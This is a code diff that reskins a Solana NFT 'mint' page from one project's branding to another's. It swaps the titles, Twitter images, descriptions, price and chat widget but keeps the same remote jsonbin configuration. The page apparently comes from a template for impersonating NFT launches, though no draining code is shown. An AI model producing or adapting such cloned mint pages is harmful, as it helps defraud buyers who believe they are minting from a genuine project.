@@ -4,18 +4,18 @@
     <meta charset="utf-8">
     <meta name="description" content="NTC" data-react-helmet="true" />
     <meta name="theme-color" content="#000000" />
-    <meta content="🌐 shroudednft.io/mint" property="og:title">
+    <meta content="🌐 kidscartoon.io/mint" property="og:title">
     <meta content="
-      🟢 Shrouded Playground Limited 777 Pre-Mint is Now Live!
+      🟢 Kids Cartoon Mint is Now Live!
      
-      Mint Price: 1.5 SOL
+      Mint Price: 1 SOL
     " property="og:description">
     <meta content="https://pbs.twimg.com/profile_banners/1517264998682271744/1652449222/1500x500" property="og:image">
     <meta name="twitter:card" content="summary_large_image">
-    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/137" />
+    <link type="application/json+oembed" href="https://api.jsonbin.io/b/622184b37caf5d67835ed9ba/139" />
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <title>Shrouded Playground</title>
-    <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/1523411529424687104/0xs-6kOF_400x400.jpg" />
+    <title>Kids Cartoon</title>
+    <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/1513229546547707904/Vb6zMpfE_400x400.jpg" />
     <link rel="stylesheet" type="text/css" href="css/all.min.css">
     <link rel="stylesheet" type="text/css" href="css/normalize.css">
     <link rel="stylesheet" type="text/css" href="css/style.css">
@@ -30,15 +30,15 @@
         });
     </script>
     <script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/62969ad27b967b1179923e81/1g4e4pi3m';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-    })();
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true;
+            s1.src='https://embed.tawk.to/629dc6617b967b117993169d/1g4s4trkk';
+            s1.charset='UTF-8';
+            s1.setAttribute('crossorigin','*');
+            s0.parentNode.insertBefore(s1,s0);
+        })();
     </script>
 </head>
 
@@ -54,12 +54,12 @@
         <div class="main-area">
 
             <div class="main-area__right">
-                <h2 class="right-title">Shrouded Playground</h2>
+                <h2 class="right-title">Kids Cartoon</h2>
 
                 <div class="right-list">
                     <li>
                         <div class="text">
-                            Shrouded Playground is a lifestyle based art, utilising a collection of open minded mavericks, eccentrics and gangsters to takeover the Solana Playground. 
+                            3333 Kids with fascinating imaginations, dreaming of what they want to be when they grow up. 
                     </li>
                     </div>
 
@@ -71,7 +71,7 @@
                         </div>
                         <div class="price-box">
                             <div id="price-total"><span>1.5</span> SOL</div>
-                            <div>3 NFT max per transaction</div>
+                            <div>1 NFT max per transaction</div>
                         </div>
                     </div>
                     <div class="button-box">
@@ -106,12 +106,12 @@
         const $numberText = document.querySelector("#total");
         const $remaining = document.querySelector('#remaining');
         const $priceResultText = document.querySelector("#price-total span");
-        let itemPriceSelected = 1.5;
+        let itemPriceSelected = 1;
         let itemCount = 1;
 
         $plusButton.addEventListener("click", function(e) {
             e.preventDefault();
-            itemCount = itemCount < 3 ? itemCount + 1 : 3;
+            itemCount = itemCount < 1 ? itemCount + 1 : 1;
             $numberText.value = itemCount;
             $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2);
         });
